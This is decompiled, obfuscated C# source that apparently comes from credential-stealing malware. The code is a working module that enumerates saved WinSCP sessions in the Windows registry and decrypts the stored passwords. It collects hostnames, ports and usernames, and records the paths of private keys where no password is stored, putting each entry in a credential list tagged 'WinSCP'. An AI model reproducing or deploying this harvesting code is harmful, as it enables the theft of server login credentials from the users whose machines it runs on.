using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using Microsoft.Win32;

// Token: 0x02000047 RID: 71
public class GClass22
{
	// Token: 0x060001D6 RID: 470 RVA: 0x0000C668 File Offset: 0x0000A868
	public static List<GClass32> smethod_0()
	{
		List<GClass32> list = new List<GClass32>();
		List<GClass32> result;
		try
		{
			string path = "SOFTWARE\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions";
			using (RegistryKey registryKey = GClass9.smethod_1(RegistryHive.CurrentUser, path))
			{
				foreach (string name in registryKey.GetSubKeyNames())
				{
					using (RegistryKey registryKey2 = registryKey.smethod_2(name))
					{
						if (registryKey2 != null)
						{
							string text = registryKey2.smethod_1("HostName", "");
							if (!string.IsNullOrEmpty(text))
							{
								string text2 = registryKey2.smethod_1("UserName", "");
								string text3 = GClass22.smethod_2(text2, registryKey2.smethod_1("Password", ""), text);
								string text4 = registryKey2.smethod_1("PublicKeyFile", "");
								text = text + ":" + registryKey2.smethod_1("PortNumber", "22");
								if (string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
								{
									text3 = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(text4));
								}
								list.Add(new GClass32
								{
									URL = text,
									Username = text2,
									Password = text3,
									Application = "WinSCP"
								});
							}
						}
					}
				}
			}
			result = list;
		}
		catch
		{
			result = list;
		}
		return result;
	}

	// Token: 0x060001D7 RID: 471 RVA: 0x0000C818 File Offset: 0x0000AA18
	private static int smethod_1(List<string> list)
	{
		int num = int.Parse(list[0]);
		int num2 = int.Parse(list[1]);
		return 255 ^ (((num << 4) + num2 ^ 163) & 255);
	}

	// Token: 0x060001D8 RID: 472 RVA: 0x0000C858 File Offset: 0x0000AA58
	private static string smethod_2(string user, string pass, string host)
	{
		string result;
		try
		{
			if (!(user == string.Empty) && !(pass == string.Empty) && !(host == string.Empty))
			{
				if (GClass22.func_0 == null)
				{
					GClass22.func_0 = new Func<char, string>(GClass22.smethod_3);
				}
				List<string> list = pass.Select(GClass22.func_0).ToList<string>();
				List<string> list2 = new List<string>();
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i] == "A")
					{
						list2.Add("10");
					}
					if (list[i] == "B")
					{
						list2.Add("11");
					}
					if (list[i] == "C")
					{
						list2.Add("12");
					}
					if (list[i] == "D")
					{
						list2.Add("13");
					}
					if (list[i] == "E")
					{
						list2.Add("14");
					}
					if (list[i] == "F")
					{
						list2.Add("15");
					}
					if ("ABCDEF".IndexOf(list[i]) == -1)
					{
						list2.Add(list[i]);
					}
				}
				List<string> list3 = list2;
				int num;
				if (GClass22.smethod_1(list3) == 255)
				{
					num = GClass22.smethod_1(list3);
				}
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				num = GClass22.smethod_1(list3);
				List<string> list4 = list3;
				list4.Remove(list4[0]);
				list4.Remove(list4[0]);
				int num2 = GClass22.smethod_1(list3) * 2;
				for (int j = 0; j < num2; j++)
				{
					list3.Remove(list3[0]);
				}
				string text = "";
				for (int k = -1; k < num; k++)
				{
					string str = ((char)GClass22.smethod_1(list3)).ToString();
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					text += str;
				}
				string text2 = user + host;
				int count = text.IndexOf(text2, StringComparison.Ordinal);
				text = text.Remove(0, count);
				text = text.Replace(text2, "");
				result = text;
			}
			else
			{
				result = "";
			}
		}
		catch
		{
			result = "";
		}
		return result;
	}

	// Token: 0x060001DA RID: 474 RVA: 0x00002DF8 File Offset: 0x00000FF8
	[CompilerGenerated]
	private static string smethod_3(char keyf)
	{
		return keyf.ToString();
	}

	// Token: 0x040000CF RID: 207
	[CompilerGenerated]
	private static Func<char, string> func_0;
}
